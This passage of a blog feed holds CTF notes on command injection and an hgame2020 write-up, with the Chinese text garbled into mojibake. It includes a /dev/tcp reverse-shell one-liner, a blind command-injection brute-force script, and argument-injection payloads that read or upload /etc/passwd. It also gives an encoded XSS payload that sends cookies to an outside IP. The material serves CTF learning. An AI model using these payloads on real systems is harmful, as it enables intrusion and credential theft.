&lt;figure class=&#34;highlight elixir&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs elixir&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ &lt;/span&gt;bash -c &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;sh &amp;gt;&amp;amp; /dev/tcp/0.0.0.0/80 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;æœåŠ¡å™¨æ— æ³•è®¿é—®å¤–ç½‘&#34;&gt;&lt;a href=&#34;#æœåŠ¡å™¨æ— æ³•è®¿é—®å¤–ç½‘&#34; class=&#34;headerlink&#34; title=&#34;æœåŠ¡å™¨æ— æ³•è®¿é—®å¤–ç½‘&#34;&gt;&lt;/a&gt;æœåŠ¡å™¨æ— æ³•è®¿é—®å¤–ç½‘&lt;/h3&gt;&lt;p&gt;çˆ†ç ´ï¼ŒEXPï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# -*-coding:utf-8 -*-import requestsimport reflag_format = re.compile(&amp;#x27;flag\\&amp;#123;[0-9a-z]&amp;#123;8&amp;#125;-[0-9a-z]&amp;#123;4&amp;#125;-[0-9a-z]&amp;#123;4&amp;#125;-[0-9a-z]&amp;#123;4&amp;#125;-[0-9a-z]&amp;#123;12&amp;#125;\\&amp;#125;&amp;#x27;)all_letter = &amp;#x27;-&amp;#125;0123456789abcdefghijklmnopqrstuvwxyz&amp;#x27;def get_flag(command):    try:        r = requests.get(&amp;#x27;http://web.train.lilac.com:10008/&amp;#x27;, params=&amp;#123;&amp;#x27;command&amp;#x27;: command&amp;#125;, timeout=1.5)    except:        return True    return Falseif __name__ == &amp;#x27;__main__&amp;#x27;:    flag = &amp;#x27;flag&amp;#123;&amp;#x27;    while flag_format.match(flag) == None:        staus = 0        for i in all_letter:            payload = &amp;#x27;| cat /flag | grep %s &amp;amp;&amp;amp; sleep 1.8&amp;#x27; % (flag + i)            print(payload)            if get_flag(payload):                staus = 1                flag += i                print(flag)                break        if staus == 0:            flag = flag[0:-1]&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;å‚æ•°æ³¨å…¥&#34;&gt;&lt;a href=&#34;#å‚æ•°æ³¨å…¥&#34; class=&#34;headerlink&#34; title=&#34;å‚æ•°æ³¨å…¥&#34;&gt;&lt;/a&gt;å‚æ•°æ³¨å…¥&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/107336&#34;&gt;https://www.anquanke.com/post/id/107336&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;tar&lt;/p&gt;
&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;tar --&lt;span class=&#34;hljs-keyword&#34;&gt;use&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;compress&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;program&lt;/span&gt;=&amp;#x27;&lt;span class=&#34;hljs-keyword&#34;&gt;cat&lt;/span&gt; /etc/passwd&amp;#x27; -&lt;span class=&#34;hljs-keyword&#34;&gt;cf&lt;/span&gt; 2.tar *&lt;span class=&#34;hljs-keyword&#34;&gt;cat&lt;/span&gt; 2.tar&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;find&lt;/p&gt;
&lt;figure class=&#34;highlight sqf&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sqf&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;find&lt;/span&gt; . -&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt; f -&lt;span class=&#34;hljs-built_in&#34;&gt;exec&lt;/span&gt; å‘½ä»¤ \; -quitfind . -&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt; f -&lt;span class=&#34;hljs-built_in&#34;&gt;exec&lt;/span&gt; cat /etc/passwd \; -quitfind . -&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt; f -&lt;span class=&#34;hljs-built_in&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; hello \; -quit&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;git&lt;/p&gt;
&lt;figure class=&#34;highlight vim&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vim&#34;&gt;git &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -i --&lt;span class=&#34;hljs-built_in&#34;&gt;line&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;number&lt;/span&gt; -&lt;span class=&#34;hljs-keyword&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;--open-files-in-pager=å‘½ä»¤;&amp;#x27;&lt;/span&gt; master&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;wget&lt;/p&gt;
&lt;figure class=&#34;highlight maxima&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs maxima&#34;&gt;$url = &amp;#x27;--&lt;span class=&#34;hljs-built_in&#34;&gt;directory&lt;/span&gt;-&lt;span class=&#34;hljs-built_in&#34;&gt;prefix&lt;/span&gt;=/&lt;span class=&#34;hljs-built_in&#34;&gt;var&lt;/span&gt;/www/html http://&lt;span class=&#34;hljs-built_in&#34;&gt;example&lt;/span&gt;.com/&lt;span class=&#34;hljs-built_in&#34;&gt;example&lt;/span&gt;.php&amp;#x27;;&lt;span class=&#34;hljs-built_in&#34;&gt;system&lt;/span&gt;(escapeshellcmd(&amp;#x27;wget &amp;#x27;.$url));&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;sendmail&lt;/p&gt;
&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;sendmail -t -i -f &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;@sth.com -C&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;passwd -X&lt;span class=&#34;hljs-regexp&#34;&gt;/tmp/&lt;/span&gt;output.txt &amp;lt; mail.txt&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;curl&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;curl -F password=@&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;passwd http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;example.com&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;mysql&lt;/p&gt;
&lt;figure class=&#34;highlight erlang-repl&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs erlang-repl&#34;&gt;mysql -uuser -ppassword -e  \! å‘½ä»¤&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;untar&lt;/p&gt;
&lt;figure class=&#34;highlight mel&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mel&#34;&gt;$zip_name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;-d /var/www/html archive.zip&amp;#x27;&lt;/span&gt;;&lt;span class=&#34;hljs-keyword&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;unzip -j &amp;#x27;&lt;/span&gt;.escapeshellarg($zip_name).&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; *.tmp -d /tmp&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;è½¯è¿æ¥&#34;&gt;&lt;a href=&#34;#è½¯è¿æ¥&#34; class=&#34;headerlink&#34; title=&#34;è½¯è¿æ¥&#34;&gt;&lt;/a&gt;è½¯è¿æ¥&lt;/h1&gt;&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;ln&lt;/span&gt; -s /etc/passwd &lt;span class=&#34;hljs-number&#34;&gt;222222&lt;/span&gt;.jpgtar cvfp &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;.tar &lt;span class=&#34;hljs-number&#34;&gt;222222&lt;/span&gt;.jpg&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;é•¿åº¦é™åˆ¶æ³¨å…¥&#34;&gt;&lt;a href=&#34;#é•¿åº¦é™åˆ¶æ³¨å…¥&#34; class=&#34;headerlink&#34; title=&#34;é•¿åº¦é™åˆ¶æ³¨å…¥&#34;&gt;&lt;/a&gt;é•¿åº¦é™åˆ¶æ³¨å…¥&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/&#34;&gt;https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¾‹ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight taggerscript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs taggerscript&#34;&gt;&amp;gt;ls&lt;span class=&#34;hljs-symbol&#34;&gt;\\&lt;/span&gt;ls&amp;gt;_&amp;gt;&lt;span class=&#34;hljs-symbol&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;\\&lt;/span&gt;&amp;gt;-t&lt;span class=&#34;hljs-symbol&#34;&gt;\\&lt;/span&gt;&amp;gt;&lt;span class=&#34;hljs-symbol&#34;&gt;\&amp;gt;&lt;/span&gt;gls&amp;gt;&amp;gt;_&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;grepå¤§æ³•&#34;&gt;&lt;a href=&#34;#grepå¤§æ³•&#34; class=&#34;headerlink&#34; title=&#34;grepå¤§æ³•&#34;&gt;&lt;/a&gt;grepå¤§æ³•&lt;/h1&gt;&lt;p&gt;&lt;code&gt;grep -ri . flag&lt;/code&gt;&lt;/p&gt;
</content>
        <updated>2020-07-09T09:01:12.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2020/02/05/hgame2020/</id>
        <title>hgame2020</title>
        <link rel="alternate" href="http://blog.m1n.me/2020/02/05/hgame2020/"/>
        <content type="html">&lt;p&gt;&lt;a href=&#34;https://hgame.vidar.club/#/challenge/list&#34;&gt;https://hgame.vidar.club/#/challenge/list&lt;/a&gt;&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;

&lt;h1 id=&#34;week1&#34;&gt;&lt;a href=&#34;#week1&#34; class=&#34;headerlink&#34; title=&#34;week1&#34;&gt;&lt;/a&gt;week1&lt;/h1&gt;&lt;h2 id=&#34;Cosmosçš„åšå®¢&#34;&gt;&lt;a href=&#34;#Cosmosçš„åšå®¢&#34; class=&#34;headerlink&#34; title=&#34;Cosmosçš„åšå®¢&#34;&gt;&lt;/a&gt;Cosmosçš„åšå®¢&lt;/h2&gt;&lt;p&gt;åˆšå¼€å§‹æ‹¿åˆ°é¢˜ç›®æç¤ºè¯´gitæºç æ³„éœ²ï¼Œå°±ç”¨githackæŠŠæºç æ‰«äº†ä¸‹æ¥ï¼Œä½†æ˜¯çœ‹äº†åŠå¤©æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œåæ¥çœ‹äº†WPæ‰çŸ¥é“ç›´æ¥å»gitä¸Šæ‰¾å†å²æäº¤è®°å½•ï¼Œemmmmm&lt;/p&gt;
&lt;h2 id=&#34;æ¥å¤´éœ¸ç‹&#34;&gt;&lt;a href=&#34;#æ¥å¤´éœ¸ç‹&#34; class=&#34;headerlink&#34; title=&#34;æ¥å¤´éœ¸ç‹&#34;&gt;&lt;/a&gt;æ¥å¤´éœ¸ç‹&lt;/h2&gt;&lt;p&gt;è€ƒå¯ŸçŸ¥è¯†ç‚¹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;referer&lt;/li&gt;
&lt;li&gt;X-Forwarded-For&lt;/li&gt;
&lt;li&gt;UA&lt;/li&gt;
&lt;li&gt;è¯·æ±‚æ–¹å¼&lt;/li&gt;
&lt;li&gt;æœ€åä¸€ä¸ªä¹Ÿæ˜¯ä¹‹å‰æ²¡è§è¿‡çš„æ—¶é—´ï¼ŒIf-Unmodified-Sinceï¼Œæ ¼å¼If-Unmodified-Since:Tue, 26 Jan 2064 00:00:00 GMT&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Code-World&#34;&gt;&lt;a href=&#34;#Code-World&#34; class=&#34;headerlink&#34; title=&#34;Code World&#34;&gt;&lt;/a&gt;Code World&lt;/h2&gt;&lt;p&gt;è®¿é—®å‘ç°403ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°æç¤º302è·³è½¬ï¼Œå°±ç›´æ¥è®¿é—®index.phpå¹¶ä¸”æŠ“åŒ…æ”¹ä¸€ä¸‹è¯·æ±‚æ–¹å¼ï¼Œç„¶åæç¤ºä»¤a=10ï¼Œé¢˜ç›®åˆæç¤ºa=b+cï¼Œå°±ç”¨payload?a=1+9,ä½†æ˜¯è¿˜è¦urlç¼–ç ä¸€ä¸‹ï¼Œä¸ç„¶+ä¼šå˜æˆç©ºæ ¼&lt;/p&gt;
&lt;h2 id=&#34;é¸¡å°¼æ³°ç«&#34;&gt;&lt;a href=&#34;#é¸¡å°¼æ³°ç«&#34; class=&#34;headerlink&#34; title=&#34;é¸¡å°¼æ³°ç«&#34;&gt;&lt;/a&gt;é¸¡å°¼æ³°ç«&lt;/h2&gt;&lt;p&gt;æç¤ºåˆ†æ•°è¦60000ä»¥ä¸Šï¼ŒæŠ“åŒ…æ”¹ä¸€ä¸‹å°±å¥½äº†&lt;/p&gt;
&lt;h1 id=&#34;week2&#34;&gt;&lt;a href=&#34;#week2&#34; class=&#34;headerlink&#34; title=&#34;week2&#34;&gt;&lt;/a&gt;week2&lt;/h1&gt;&lt;h2 id=&#34;Cosmosåšå®¢çš„åå°&#34;&gt;&lt;a href=&#34;#Cosmosåšå®¢çš„åå°&#34; class=&#34;headerlink&#34; title=&#34;Cosmosåšå®¢çš„åå°&#34;&gt;&lt;/a&gt;Cosmosåšå®¢çš„åå°&lt;/h2&gt;&lt;p&gt;è®¿é—®çœ‹åˆ°ç™»é™†ç•Œé¢ï¼Œåˆšå¼€å§‹ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œå¼„åŠå¤©ä¸è¡Œï¼Œå¿˜è®°äº†æç¤ºåªç”¨äº†HTMLå’ŒPHPï¼Œç„¶åç›´æ¥è®¿é—®å‘ç°æœ‰?action=login.phpï¼Œåº”è¯¥å¯ä»¥ç”¨phpä¸ºåè®®è¯»æºç ï¼Œå› æ­¤æ‹¿åˆ°äº†login.phpå’Œadmin.phpçš„æºç &lt;br&gt;åœ¨login.phpä¸­å‘ç°debugå¯ä»¥è¯»å–ä»»æ„å˜é‡ï¼Œè¯»å–ä¸€ä¸‹usernameå’Œpasswordç„¶å$admin_passwordåˆæ˜¯å›ºå®šçš„ï¼Œè¯»å–å‘ç°æ˜¯oeå¼€å¤´çš„ï¼ˆä¿å­˜ä¸€ä¸ª0eå¼€å¤´çš„MD5å€¼å’ŒåŸå€¼ä»¥ä¾¿ä¸æ—¶ä¹‹éœ€s878926199a/&lt;br&gt;0e545993274517709034328855841020ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥çªç ´ç™»é™†ï¼Œå°±æ¥åˆ°äº†admin.phpé¡µé¢ï¼Œè¯»æºç å‘ç°ç”¨CSRFå’Œfileä¼ªåè®®æ‹¿åˆ°flagï¼Œpayloadï¼šfile://localhost/flag&lt;/p&gt;
&lt;h2 id=&#34;Cosmosçš„ç•™è¨€æ¿-1&#34;&gt;&lt;a href=&#34;#Cosmosçš„ç•™è¨€æ¿-1&#34; class=&#34;headerlink&#34; title=&#34;Cosmosçš„ç•™è¨€æ¿-1&#34;&gt;&lt;/a&gt;Cosmosçš„ç•™è¨€æ¿-1&lt;/h2&gt;&lt;p&gt;ç”¨å•å¼•å·é—­åˆå›æ˜¾ä¸ä¸€æ ·ï¼Œå­˜åœ¨sql&lt;br&gt;æ³¨å…¥ç‚¹ï¼Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼è¿˜æœ‰selectï¼Œç©ºæ ¼å¯ä»¥ç”¨/**/ç»•è¿‡ï¼Œselectå¯ä»¥åŒå†™ç»•è¿‡ã€‚ä½†æ˜¯è¿™é‡Œçš„#è¦urlç¼–ç æˆ%23ï¼Œä¸ç„¶è¿‡ä¸å» ï¼Œä¸€ç›´å¡åœ¨è¿™é‡Œï¼Œç„¶åå°±æ˜¯ç†Ÿæ‚‰çš„æ‹¿flagç¯èŠ‚&lt;/p&gt;
&lt;h2 id=&#34;Cosmosçš„æ–°è¯­è¨€&#34;&gt;&lt;a href=&#34;#Cosmosçš„æ–°è¯­è¨€&#34; class=&#34;headerlink&#34; title=&#34;Cosmosçš„æ–°è¯­è¨€&#34;&gt;&lt;/a&gt;Cosmosçš„æ–°è¯­è¨€&lt;/h2&gt;&lt;p&gt;è®¿é—®mycodeæ‹¿åˆ°æºç ï¼Œå°±æ˜¯ä¸€å±‚åˆä¸€å±‚çš„åŠ å¯†ï¼Œï¼ŒæŒ‰ç…§åŠ å¯†æ­¥éª¤è§£å¯†å°±å¥½äº†ã€‚ç”±äºtokenä¼šå®æ—¶åˆ·æ–°ï¼Œè¿™é‡Œç”¨pyè„šæœ¬è·‘ä¸€ä¸‹å°±å¥½äº†&lt;/p&gt;
&lt;h2 id=&#34;Cosmosçš„èŠå¤©å®¤&#34;&gt;&lt;a href=&#34;#Cosmosçš„èŠå¤©å®¤&#34; class=&#34;headerlink&#34; title=&#34;Cosmosçš„èŠå¤©å®¤&#34;&gt;&lt;/a&gt;Cosmosçš„èŠå¤©å®¤&lt;/h2&gt;&lt;p&gt;æç¤ºå¿…é¡»ç®¡ç†å‘˜çš„tokenæ‰èƒ½æ‹¿flagï¼Œç»“åˆé¢˜ç›®çœ‹åº”è¯¥æ˜¯è€ƒå¯ŸXSSæ‹¿cookieã€‚ç„¶åå¼€å§‹æµ‹è¯•è¿‡æ»¤ï¼Œå‘ç°è¿‡æ»¤äº†&amp;lt;ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡HTMLå®ä½“ç¼–ç ç»•è¿‡ï¼Œæ„é€ payloadï¼Œï¼ˆè¿™é‡Œæ”¾ä¸€ä¸ªæ‹¿cookieå¹¶ä¸”ç™»é™†çš„æ€»ç»“æ–‡ç« &lt;a href=&#34;https://blog.csdn.net/lhh134/article/details/86477305%E4%BB%A5%E4%BE%BF%E6%97%A5%E5%90%8E%E5%BF%98%E8%AE%B0%EF%BC%89&#34;&gt;https://blog.csdn.net/lhh134/article/details/86477305ä»¥ä¾¿æ—¥åå¿˜è®°ï¼‰&lt;/a&gt;&lt;br&gt;ç„¶åç”¨payloadï¼š&lt;code&gt;&amp;lt;svg/onload=&amp;quot;&amp;amp;#x77;&amp;amp;#x69;&amp;amp;#x6e;&amp;amp;#x64;&amp;amp;#x6f;&amp;amp;#x77;&amp;amp;#x2e;&amp;amp;#x6c;&amp;amp;#x6f;&amp;amp;#x63;&amp;amp;#x61;&amp;amp;#x74;&amp;amp;#x69;&amp;amp;#x6f;&amp;amp;#x6e;&amp;amp;#x2e;&amp;amp;#x68;&amp;amp;#x72;&amp;amp;#x65;&amp;amp;#x66;&amp;amp;#x3d;&amp;amp;#x22;&amp;amp;#x68;&amp;amp;#x74;&amp;amp;#x74;&amp;amp;#x70;&amp;amp;#x3a;&amp;amp;#x2f;&amp;amp;#x2f;&amp;amp;#x34;&amp;amp;#x37;&amp;amp;#x2e;&amp;amp;#x39;&amp;amp;#x36;&amp;amp;#x2e;&amp;amp;#x32;&amp;amp;#x33;&amp;amp;#x33;&amp;amp;#x2e;&amp;amp;#x32;&amp;amp;#x31;&amp;amp;#x36;&amp;amp;#x2f;&amp;amp;#x3f;&amp;amp;#x73;&amp;amp;#x3d;&amp;amp;#x22;&amp;amp;#x2b;&amp;amp;#x64;&amp;amp;#x6f;&amp;amp;#x63;&amp;amp;#x75;&amp;amp;#x6d;&amp;amp;#x65;&amp;amp;#x6e;&amp;amp;#x74;&amp;amp;#x2e;&amp;amp;#x63;&amp;amp;#x6f;&amp;amp;#x6f;&amp;amp;#x6b;&amp;amp;#x69;&amp;amp;#x65;&amp;amp;#x3b;&amp;quot;&lt;/code&gt;æ‹¿åˆ°äº†token&lt;br&gt;/?token=f802788a02a51f9c624bb5d91815bï¼Œè®¿é—®flagé¡µé¢ï¼Œæ”¹ä¸€ä¸‹tokenå°±æ‹¿åˆ°äº†flag&lt;/p&gt;
&lt;h1 id=&#34;week3&#34;&gt;&lt;a href=&#34;#week3&#34; class=&#34;headerlink&#34; title=&#34;week3&#34;&gt;&lt;/a&gt;week3&lt;/h1&gt;&lt;h2 id=&#34;åºåˆ—ä¹‹äº‰-Ordinal-Scale&#34;&gt;&lt;a href=&#34;#åºåˆ—ä¹‹äº‰-Ordinal-Scale&#34; class=&#34;headerlink&#34; title=&#34;åºåˆ—ä¹‹äº‰ - Ordinal Scale&#34;&gt;&lt;/a&gt;åºåˆ—ä¹‹äº‰ - Ordinal Scale&lt;/h2&gt;&lt;p&gt;å…ˆæŸ¥çœ‹æºä»£ç å‘ç°source.zipï¼Œæ‹¿åˆ°æºç ï¼Œåˆæ­¥çœ‹ä¸€ä¸‹åº”è¯¥æ˜¯PHPååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œå…ˆçœ‹ä¸€ä¸‹game.phpå‘ç°&lt;/p&gt;
&lt;figure class=&#34;highlight php-template&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php-template&#34;&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$game&lt;/span&gt;-&amp;gt;rank-&amp;gt;Get() === &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&amp;#123;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;xml&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;hgame&amp;#123;flag_is_here&amp;#125;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &amp;#125;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
